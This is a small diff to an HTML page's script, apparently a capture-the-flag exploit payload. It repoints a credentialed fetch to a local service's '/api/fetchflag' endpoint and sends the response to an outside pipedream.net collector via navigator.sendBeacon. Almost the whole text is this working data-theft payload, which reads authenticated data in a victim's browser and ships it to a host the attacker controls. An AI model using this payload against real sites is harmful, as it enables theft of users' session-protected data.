@@ -3,7 +3,7 @@
 <body>
 
 <script>
-fetch('/api/fetchflag', {credentials: 'include'})
+fetch('http://127.0.0.1:20007/api/fetchflag', {credentials: 'include'})
 .then(r => r.text())
 .then(d => {
   navigator.sendBeacon("https://eofvdc4qg9ln8yd.m.pipedream.net", d);
